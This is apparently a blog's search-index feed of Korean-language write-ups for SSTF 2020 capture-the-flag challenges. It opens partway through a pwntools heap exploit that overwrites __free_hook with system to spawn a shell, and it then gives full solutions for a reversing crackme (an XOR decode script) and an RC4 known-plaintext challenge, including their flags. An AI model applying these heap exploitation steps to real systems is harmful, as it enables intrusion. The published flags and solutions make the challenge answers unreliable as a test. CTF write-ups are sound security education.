class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x20</span>):p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2/3/4):&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)gdb.attach(p)<span class="hljs-comment"># AW</span>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, p64(free_hook))p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;(1/2): &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;First name: &#x27;</span>, p64(system))p.sendlineafter(<span class="hljs-string">&#x27;Last name: &#x27;</span>, <span class="hljs-string">&#x27;Fabu1ous&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Index of ticket: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.interactive()</code></pre><p><img src="/2020/10/18/fabu1ous/sstf-t-express/image17.png"></p><p>Q.E.D</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>out of bound</tag>
      
      <tag>off by one</tag>
      
      <tag>double free bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF CrackMe101</title>
    <link href="/2020/10/18/idioth/sstf-crackme101/"/>
    <url>/2020/10/18/idioth/sstf-crackme101/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-crackme101/image.png"></p><p>64bit elf íŒŒì¼ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. Ubuntu 20.04 64bitì—ì„œ ì‹¤í–‰ì„ í•´ë³´ê² ìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/idioth/sstf-crackme101/image1.png"></p><p>Passwordë¥¼ ì…ë ¥í•˜ê³  ì •ìƒì ì¸ íŒ¨ìŠ¤ì›Œë“œë¥¼ ì…ë ¥í–ˆì„ ì‹œ í”Œë˜ê·¸ê°€ ë‚˜ì˜¤ëŠ” í˜•ì‹ìœ¼ë¡œ ìƒê°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>Ghidraë¥¼ ì‚¬ìš©í•˜ì—¬ crackme101ì´ ì–´ë–¤ ì‹ìœ¼ë¡œ êµ¬ë™ë˜ëŠ”ì§€ í™•ì¸í•´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤.</p><h1 id="crackme101-ë¶„ì„"><a href="#crackme101-ë¶„ì„" class="headerlink" title="crackme101 ë¶„ì„"></a>crackme101 ë¶„ì„</h1><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">size_t</span> sVar2;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  <span class="hljs-keyword">int</span> local_88;  <span class="hljs-keyword">char</span> local_78 [<span class="hljs-number">104</span>];  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password! : &quot;</span>);  __isoc99_scanf(&amp;DAT_0010206e,local_78);  sVar2 = <span class="hljs-built_in">strlen</span>(local_78);  iVar1 = (<span class="hljs-keyword">int</span>)sVar2;  getMaskedStr(local_78,local_78,local_78);  local_88 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> ((local_88 &lt; iVar1 &amp;&amp;         (<span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>[local_88] == local_78[(iVar1 - local_88) + <span class="hljs-number">-1</span>])))  &#123;    local_88 = local_88 + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">if</span> (local_88 != iVar1) &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Login Failed!&quot;</span>);    <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>      __stack_chk_fail();    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  &#125;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Successfully logged in!\nGood job!&quot;</span>);                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre><p>ì…ë ¥ëœ íŒ¨ìŠ¤ì›Œë“œëŠ” <code>local_78</code>ì— ë“¤ì–´ê°€ê²Œ ë˜ê³  <code>iVar1</code>ëŠ” ì…ë ¥í•œ íŒ¨ìŠ¤ì›Œë“œì˜ ê¸¸ì´ê°€ ë©ë‹ˆë‹¤.</p><p><code>getMaskedStr</code> í•¨ìˆ˜ì—ì„œ ì¸ìë¥¼ ëª¨ë‘ <code>local_78</code>ë¡œ ë°›ì•„ì„œ ì–´ë– í•œ ì‘ì—…ì„ ìˆ˜í–‰í•œ í›„ â€œDtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;â€ ë¬¸ìì—´ê³¼ <code>ocal_78</code> ë¬¸ìì—´ì„ ë’·ë¶€ë¶„ì˜ ë°°ì—´ë¶€í„° <code>iVar1</code>ì˜ í¬ê¸°ë§Œí¼ ë¹„êµí•©ë‹ˆë‹¤.</p><p><code>local_88</code>ê³¼ <code>iVar1</code>ì´ ê°™ì•„ì•¼ í•˜ë ¤ë©´ while ë¬¸ì˜ ì¡°ê±´ì¸ ê° ë¬¸ìì—´ì´ ë™ì¼í•´ì•¼ í•˜ë¯€ë¡œ <code>getMaskedStr</code> í•¨ìˆ˜ë¥¼ í†µê³¼í•œ <code>local_78</code>ì˜ ê°’ì´ ì–´ë– í•œ ê°’ì¸ì§€ ë¨¼ì € ì•Œì•„ì•¼ í•©ë‹ˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getMaskedStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1,<span class="hljs-keyword">long</span> param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">size_t</span> sVar1;  <span class="hljs-keyword">int</span> local_18;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  local_18 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> (local_18 &lt; (<span class="hljs-keyword">int</span>)sVar1) &#123;    *(byte *)(param_2 + local_18) =         param_1[local_18] ^ <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk&#123;q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>[local_18];    local_18 = local_18 + <span class="hljs-number">1</span>;  &#125;  *(undefined *)(param_2 + (<span class="hljs-keyword">int</span>)sVar1) = <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>ì¸ìë¡œ ë°›ì€ paramì€ ì…ë ¥ë°›ì€ íŒ¨ìŠ¤ì›Œë“œ ê°’ì´ ë  ê²ƒì…ë‹ˆë‹¤.</p><p>ë¬¸ìì—´ì˜ ê¸¸ì´ë§Œí¼ â€œu7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9â€ë¬¸ìì—´ê³¼ ë™ì¼í•œ indexë¼ë¦¬ xor ì—°ì‚°ì„ ìˆ˜í–‰í•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ íŒ¨ìŠ¤ì›Œë“œ checkê°€ ì–´ë– í•œ ì‹ìœ¼ë¡œ ì§„í–‰ì´ ë˜ëŠ”ì§€ ìš”ì•½í•´ë³´ë©´</p><ol><li>íŒ¨ìŠ¤ì›Œë“œë¥¼ ì…ë ¥ì„ ë°›ëŠ”ë‹¤.</li><li><code>getMaskedStr</code> í•¨ìˆ˜ë¥¼ í†µí•´ â€œu7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9â€ ë¬¸ìì—´ê³¼ ë™ì¼í•œ ì¸ë±ìŠ¤ë¼ë¦¬ xor ì—°ì‚°ì„ ìˆ˜í–‰</li><li>ìˆ˜í–‰í•œ ê²°ê³¼ë¥¼ ë’¤ì§‘ì–´ì„œ â€œDtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;â€ê³¼ ë§ëŠ”ì§€ ê²€ì‚¬</li><li>ë§ìœ¼ë©´ Correct</li></ol><p>ê·¸ëŸ¬ë©´ ì €í¬ê°€ ë³µí˜¸í™”í•  ì‹œë‚˜ë¦¬ì˜¤ëŠ”</p><ol><li><p>ìµœì¢…ì ìœ¼ë¡œ ë‚˜ì˜¬ ê°’ì€ â€œDtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;â€ì´ë¯€ë¡œ í•´ë‹¹ ë¬¸ìì—´ê³¼ â€œu7fl(3JC=UkJGEhPk{q`/X5UzTI.t&amp;A]2[rPM9â€ë¥¼ ë’¤ì§‘ì€ ë¬¸ìì—´ì„ xor ì—°ì‚°</p></li><li><p>ë‚˜ì˜¨ ë¬¸ìì—´ì„ ë‹¤ì‹œ ë’¤ì§‘ìŒ</p></li><li><p>Get Flag!!</p></li></ol><h1 id="Decode-Code"><a href="#Decode-Code" class="headerlink" title="Decode Code"></a>Decode Code</h1><pre><code class="hljs python">key1 = <span class="hljs-string">&quot;u7fl(3JC=UkJGEhPk&#123;q`/X5UzTI.t&amp;A]2[rPM9&quot;</span>cmp_key = <span class="hljs-string">&quot;Dtd&gt;=mhpNCqz?N!j(Z?B644[.$~96b6zjS*2t&amp;&quot;</span>result1 = <span class="hljs-string">&quot;&quot;</span>revkey = key1[::<span class="hljs-number">-1</span>]<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(key1)):    result1 += chr(ord(cmp_key[i]) ^ ord(revkey[i]))print(result1[::<span class="hljs-number">-1</span>])</code></pre><p><img src="/2020/10/18/idioth/sstf-crackme101/image2.png"></p><p>Flag : SCTF{Y0u_cR4ck3d_M3_up_t4k3_7h15_fL49}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF RC_four</title>
    <link href="/2020/10/18/idioth/sstf-rc-four/"/>
    <url>/2020/10/18/idioth/sstf-rc-four/</url>
    
    <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p><img src="/2020/10/18/idioth/sstf-rc-four/image.png"></p><p>ì••ì¶•ì„ í’€ë©´ challenge.pyì™€ output.txt íŒŒì¼ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/idioth/sstf-rc-four/image1.png"></p><p>output.txt íŒŒì¼ì—ëŠ” ì•”í˜¸í™”ëœ ê²ƒìœ¼ë¡œ ì¶”ì¸¡ë˜ëŠ” ë¬¸ìì—´ì´ 2ì¤„ ì¡´ì¬í•©ë‹ˆë‹¤.</p><h1 id="challenge-py-ë¶„ì„"><a href="#challenge-py-ë¶„ì„" class="headerlink" title="challenge.py ë¶„ì„"></a>challenge.py ë¶„ì„</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> key, flag<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> hexlify<span class="hljs-comment">#RC4 encrypt function with &quot;key&quot; variable.</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">data</span>):</span><span class="hljs-comment">#check the key is long enough</span><span class="hljs-keyword">assert</span>(len(key) &gt; <span class="hljs-number">128</span>)<span class="hljs-comment">#make RC4 instance</span>cipher = ARC4.new(key)<span class="hljs-comment">#We don&#x27;t use the first 1024 bytes from the key stream.</span><span class="hljs-comment">#Actually this is not important for this challenge. Just ignore.</span>cipher.encrypt(<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">1024</span>)<span class="hljs-comment">#encrypt given data, and return it.</span><span class="hljs-keyword">return</span> cipher.encrypt(data)msg = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span><span class="hljs-keyword">print</span> (hexlify(encrypt(msg)).decode())<span class="hljs-keyword">print</span> (hexlify(encrypt(flag)).decode())</code></pre><p>challenge íŒŒì¼ì„ í•´ë³´ë©´ arc4ë¥¼ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”ë¥¼ ì§„í–‰í•œ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>output.txtì˜ ì²« ë²ˆì§¸ ì¤„ì€ msgë¥¼ ì•”í˜¸í™”í•œ ë¶€ë¶„ì´ê³  ë‘ ë²ˆì§¸ ì¤„ì€ flagì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><a href="https://en.wikipedia.org/wiki/RC4">rc4 ì•Œê³ ë¦¬ì¦˜</a>ì€ ìŠ¤íŠ¸ë¦¼ ì•”í˜¸ë¡œ key ê°’ì„ ì‚¬ìš©í•˜ì—¬ ì…”í”Œë§ì„ í†µí•´ í‚¤ ìŠ¤íŠ¸ë¦¼ ë°”ì´íŠ¸ë¥¼ ìƒì„±í•œ í›„ í•´ë‹¹ í‚¤ ìŠ¤íŠ¸ë¦¼ê³¼ xor ì—°ì‚°ì„ í†µí•´ ì•”í˜¸í™”ë¥¼ ì§„í–‰í•©ë‹ˆë‹¤.</p><p>key ê°’ì„ ì‚¬ìš©í•˜ì—¬ ìƒì„±ëœ key streamê³¼ ë¬¸ìì—´ì„ xor ì—°ì‚°í•˜ì—¬ ìµœì¢… ì•”í˜¸ë¬¸ì´ ë‚˜ì˜¤ëŠ” ê²ƒì„ í™œìš©í•˜ë©´ key ê°’ì„ ì•Œì§€ ëª»í•´ë„ flag ì•”í˜¸ë¬¸ì„ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>key stream ^ ë¬¸ìì—´ = ì•”í˜¸ë¬¸ì´ë¯€ë¡œ ì•”í˜¸ë¬¸ ^ ë¬¸ìì—´ì„ ìˆ˜í–‰í•˜ë©´ key streamì„ ì•Œ ìˆ˜ ìˆê³  í•´ë‹¹ key streamê³¼ flag ì•”í˜¸ë¬¸ì„ xor ì—°ì‚°ì„ ìˆ˜í–‰í•˜ë©´ flag ê°’ì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="Decrypt-Code"><a href="#Decrypt-Code" class="headerlink" title="Decrypt Code"></a>Decrypt Code</h1><pre><code class="hljs python">text = <span class="hljs-string">&quot;RC4 is a Stream Cipher, which is very simple and fast.&quot;</span>result = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xef</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xf8</span>]stream = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text))]dec_flag = [<span class="hljs-number">0x62</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>]flag = <span class="hljs-string">&quot;&quot;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(text)):    stream[i] = str(int(ord(text[i]) ^ result[i]))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(dec_flag)):    flag += str(chr(int(stream[i]) ^ dec_flag[i]))print(flag)</code></pre><p><img src="/2020/10/18/idioth/sstf-rc-four/image2.png"></p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>samsung</tag>
      
      <tag>ctf</tag>
      
      <tag>sstf</tag>
      
      <tag>idioth</tag>
      
      <tag>crypto</tag>
      
      <tag>rc4</tag>
      
      <tag>decrypt</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
